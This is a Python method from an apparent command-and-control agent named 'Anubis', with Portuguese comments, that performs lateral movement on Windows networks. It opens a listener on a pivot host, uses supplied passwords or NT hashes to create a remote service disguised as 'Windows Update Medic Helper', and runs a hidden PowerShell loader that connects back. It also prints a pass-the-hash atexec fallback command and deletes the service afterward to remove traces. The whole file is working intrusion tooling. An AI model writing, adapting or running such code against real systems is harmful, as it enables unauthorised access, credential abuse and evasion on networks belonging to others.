    # reverse_pipe_ext — Anubis agent (MÉTODO da classe anubis)
    # Lateral: sobe listener no PIVÔ e dispara no ALVO um loader que conecta de SAÍDA
    # Canais: tcp (default) | smb_note (só instruções)
    # Auth no alvo: password (scm/net use) | nthash (token atual + fallback atexec)
    # window: hidden|console | mode: full|listen_only|trigger_only|status|stop

    def reverse_pipe_ext(
        self,
        task_id,
        target="",
        username="",
        password="",
        nthash="",
        domain="",
        listen_ip="",
        listen_port=9445,
        channel="tcp",
        window="hidden",
        mode="full",
        payload="cmd",
        service_name="",
        delete_after=True,
        bind_host="0.0.0.0",
        timeout_sec=45,
        socks_port=7005,
    ):
        import os, sys, re, time, socket, threading, subprocess, random, string, tempfile

        def out(msg):
            return str(msg)

        def run(cmd, timeout=120):
            try:
                r = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    shell=isinstance(cmd, str),
                )
                return r.returncode, ((r.stdout or "") + (r.stderr or "")).strip()
            except Exception as e:
                return -1, str(e)

        if sys.platform != "win32":
            return out("reverse_pipe_ext: requer Windows (agente no pivô)")

        target = str(target or "").strip().lstrip("\\")
        username = str(username or "").strip()
        password = str(password or "")
        nthash = str(nthash or "").strip().replace(" ", "")
        domain = str(domain or "").strip()
        listen_ip = str(listen_ip or "").strip()
        channel = str(channel or "tcp").lower().strip()
        window = str(window or "hidden").lower().strip()
        mode = str(mode or "full").lower().strip()
        payload = str(payload or "cmd").lower().strip()
        service_name = str(service_name or "").strip()
        bind_host = str(bind_host or "0.0.0.0").strip()
        if isinstance(delete_after, str):
            delete_after = delete_after.strip().lower() in ("1", "true", "yes", "sim")
        delete_after = bool(delete_after)
        try:
            listen_port = int(listen_port)
        except Exception:
            listen_port = 9445
        try:
            timeout_sec = int(timeout_sec)
        except Exception:
            timeout_sec = 45

        # estado global simples no processo do agent
        if not hasattr(self, "_rev_pipe"):
            self._rev_pipe = {"server": None, "thread": None, "port": None, "log": []}

        lines = []
        lines.append(
            "[*] reverse_pipe_ext mode=%s channel=%s port=%s target=%s"
            % (mode, channel, listen_port, target or "-")
        )

        # ── stop ─────────────────────────────────────────────────────────────
        if mode == "stop":
            srv = self._rev_pipe.get("server")
            if srv:
                try:
                    srv.close()
                except Exception:
                    pass
                self._rev_pipe["server"] = None
                self._rev_pipe["thread"] = None
                lines.append("[+] listener parado")
            else:
                lines.append("[*] nenhum listener ativo neste processo")
            return out("\n".join(lines))

        # ── status ───────────────────────────────────────────────────────────
        if mode == "status":
            alive = False
            th = self._rev_pipe.get("thread")
            if th and th.is_alive():
                alive = True
            lines.append("[*] listener_alive=%s port=%s" % (alive, self._rev_pipe.get("port")))
            for e in (self._rev_pipe.get("log") or [])[-15:]:
                lines.append("  " + e)
            return out("\n".join(lines))

        # IP do pivô para o alvo conectar
        if not listen_ip:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                listen_ip = s.getsockname()[0]
                s.close()
            except Exception:
                listen_ip = "127.0.0.1"
            # tenta interface "mais interna" se houver
            try:
                hn = socket.gethostname()
                for ai in socket.getaddrinfo(hn, None, socket.AF_INET):
                    ip = ai[4][0]
                    if ip.startswith("10.") or ip.startswith("192.168.") or ip.startswith("172."):
                        listen_ip = ip
                        break
            except Exception:
                pass

        lines.append("[*] callback_ip=%s (alvo deve alcançar este IP:%s)" % (listen_ip, listen_port))

        def handle_client(conn, addr):
            try:
                self._rev_pipe["log"].append("[+] connect from %s:%s" % (addr[0], addr[1]))
                conn.settimeout(2.0)
                # banner minimo
                try:
                    conn.sendall(b"[anubis-rev] connected\n")
                except Exception:
                    pass
                # se payload for cmd: relay simples stdin/stdout nao interativo —
                # apenas marca conexao e mantém aberta alguns segundos para evidencia
                buf = b""
                try:
                    conn.sendall(b"whoami\\r\\n")
                    time.sleep(0.5)
                    try:
                        buf = conn.recv(4096)
                    except Exception:
                        pass
                except Exception:
                    pass
                if buf:
                    self._rev_pipe["log"].append("[<] %s" % buf[:200].decode("utf-8", errors="replace"))
                time.sleep(3)
            finally:
                try:
                    conn.close()
                except Exception:
                    pass
                self._rev_pipe["log"].append("[*] closed %s" % (addr[0],))

        def serve_tcp(host, port):
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                srv.bind((host, port))
                srv.listen(5)
                srv.settimeout(1.0)
                self._rev_pipe["server"] = srv
                self._rev_pipe["port"] = port
                self._rev_pipe["log"].append("[+] listening %s:%s" % (host, port))
                end = time.time() + max(timeout_sec, 10)
                while time.time() < end and self._rev_pipe.get("server") is srv:
                    try:
                        conn, addr = srv.accept()
                        t = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
                        t.start()
                    except socket.timeout:
                        continue
                    except Exception as e:
                        self._rev_pipe["log"].append("[!] accept: %s" % e)
                        break
            except Exception as e:
                self._rev_pipe["log"].append("[!] bind/listen: %s" % e)
            finally:
                try:
                    srv.close()
                except Exception:
                    pass
                if self._rev_pipe.get("server") is srv:
                    self._rev_pipe["server"] = None
                self._rev_pipe["log"].append("[*] listener thread exit")

        def start_listener():
            if self._rev_pipe.get("thread") and self._rev_pipe["thread"].is_alive():
                lines.append("[*] reutilizando listener porta %s" % self._rev_pipe.get("port"))
                return True
            th = threading.Thread(
                target=serve_tcp, args=(bind_host, listen_port), daemon=True
            )
            self._rev_pipe["thread"] = th
            th.start()
            time.sleep(0.8)
            return True

        # loader PowerShell one-liner (TCP reverse "probe" — evidencia de callback)
        # payload=cmd: tenta spawn cmd via .NET (simples) ou so socket echo
        def build_trigger_cmd():
            # minimiza aspas para sc/cmd
            ps = (
                "$c=New-Object Net.Sockets.TCPClient('%s',%d);"
                "$s=$c.GetStream();"
                "$w=New-Object IO.StreamWriter($s);"
                "$w.AutoFlush=$true;"
                "$w.WriteLine($env:COMPUTERNAME+'\\\\'+$env:USERNAME);"
                "$b=New-Object byte[] 1024;"
                "try{$n=$s.Read($b,0,1024)}catch{};"
                "$c.Close()"
            ) % (listen_ip, listen_port)
            # encoded opcional — aqui usamos -c com escape
            if window == "console":
                return (
                    'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "%s"'
                    % ps.replace('"', '\\"')
                )
            return (
                'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden '
                '-Command "%s"' % ps.replace('"', '\\"')
            )

        if mode in ("full", "listen_only"):
            start_listener()
            lines.append("[+] listener ativo em %s:%s (timeout ~%ss)" % (bind_host, listen_port, timeout_sec))

        if mode == "listen_only":
            # espera um pouco e devolve log
            time.sleep(min(5, timeout_sec))
            for e in (self._rev_pipe.get("log") or [])[-10:]:
                lines.append("  " + e)
            lines.append("[*] mode=listen_only — dispare o alvo manualmente ou mode=trigger_only/full")
            return out("\n".join(lines))

        if mode in ("full", "trigger_only"):
            if not target:
                return out("\n".join(lines + ["[-] target obrigatorio para trigger"]))
            if not username:
                return out("\n".join(lines + ["[-] username obrigatorio"]))
            if not password and not nthash:
                return out("\n".join(lines + ["[-] password e/ou nthash"]))

            if nthash and ":" in nthash:
                nthash = nthash.split(":")[-1].strip()
            if nthash and not re.fullmatch(r"[0-9a-fA-F]{32}", nthash or ""):
                return out("\n".join(lines + ["[-] nthash invalido"]))

            trigger = build_trigger_cmd()
            lines.append("[*] trigger=%s" % trigger[:180])

            if not service_name:
                service_name = "WaaSMedicSvc_%s" % "".join(
                    random.choices(string.ascii_lowercase + string.digits, k=4)
                )

            # reutiliza padrao scm: net use + sc
            ipc = r"\\%s\IPC$" % target
            user_candidates = []
            if domain and domain not in (".", "WORKGROUP"):
                user_candidates.append("%s\\%s" % (domain, username))
            user_candidates.extend(
                ["%s\\%s" % (target, username), ".\\%s" % username, username]
            )
            seen = set()
            user_list = []
            for u in user_candidates:
                if u not in seen:
                    seen.add(u)
                    user_list.append(u)

            def sc_remote(args):
                return run(["sc", "\\\\%s" % target] + args, timeout=90)

            def net_use_del():
                run(["net", "use", ipc, "/delete", "/y"], timeout=15)

            triggered = False
            if password:
                mapped = False
                for u in user_list:
                    rc, msg = run(
                        ["net", "use", ipc, "/user:%s" % u, password], timeout=30
                    )
                    lines.append("[net use %s] rc=%s %s" % (u, rc, (msg or "")[:160]))
                    if rc == 0 or "1219" in (msg or "") or "successfully" in (msg or "").lower():
                        mapped = True
                        break
                binpath = "cmd.exe /c %s" % trigger
                sc_remote(["stop", service_name])
                sc_remote(["delete", service_name])
                rc, msg = sc_remote(
                    [
                        "create",
                        service_name,
                        "binPath=",
                        binpath,
                        "type=",
                        "own",
                        "start=",
                        "demand",
                        "DisplayName=",
                        "Windows Update Medic Helper",
                    ]
                )
                lines.append("[sc create] rc=%s %s" % (rc, (msg or "")[:400]))
                if rc == 0 or "1073" in (msg or ""):
                    rc2, msg2 = sc_remote(["start", service_name])
                    lines.append("[sc start] rc=%s %s" % (rc2, (msg2 or "")[:400]))
                    triggered = True
                if delete_after:
                    time.sleep(3)
                    sc_remote(["stop", service_name])
                    sc_remote(["delete", service_name])
                net_use_del()
            else:
                # nthash: tenta sc as-self
                lines.append("[!] nthash: net use nao aplica; tentando sc com token atual")
                binpath = "cmd.exe /c %s" % trigger
                sc_remote(["delete", service_name])
                rc, msg = sc_remote(
                    [
                        "create",
                        service_name,
                        "binPath=",
                        binpath,
                        "type=",
                        "own",
                        "start=",
                        "demand",
                    ]
                )
                lines.append("[sc create-as-self] rc=%s %s" % (rc, (msg or "")[:400]))
                if rc == 0:
                    sc_remote(["start", service_name])
                    triggered = True
                    if delete_after:
                        time.sleep(3)
                        sc_remote(["delete", service_name])
                else:
                    dom = domain if domain and domain not in (".", "WORKGROUP") else "DOMAIN"
                    lines.append(
                        "[*] Fallback Kali:\n"
                        "  proxychains atexec.py -hashes :%s '%s/%s@%s' '%s'\n"
                        "  proxychains atexec.py -hashes :%s './%s@%s' '%s'"
                        % (
                            nthash,
                            dom,
                            username,
                            target,
                            trigger.replace("'", "'\\''"),
                            nthash,
                            username,
                            target,
                            trigger.replace("'", "'\\''"),
                        )
                    )

            if triggered and mode == "full":
                lines.append("[*] aguardando callback TCP ate %ss..." % timeout_sec)
                end = time.time() + timeout_sec
                while time.time() < end:
                    logs = self._rev_pipe.get("log") or []
                    if any("connect from" in x for x in logs):
                        break
                    time.sleep(1)
                for e in (self._rev_pipe.get("log") or [])[-15:]:
                    lines.append("  " + e)
                if any("connect from" in x for x in (self._rev_pipe.get("log") or [])):
                    lines.append("[+] CALLBACK recebido no pivô — path reverso OK")
                else:
                    lines.append(
                        "[-] sem callback: alvo nao alcanca %s:%s (ACL/firewall) ou trigger falhou"
                        % (listen_ip, listen_port)
                    )
            elif triggered:
                lines.append("[+] trigger enviado (mode=trigger_only) — confira mode=status/listen")

        if channel == "smb_note":
            lines.append(
                "[*] channel=smb_note: use share do pivô + script no alvo para conectar; "
                "TCP e o path implementado nesta versao"
            )

        return out("\n".join(lines))
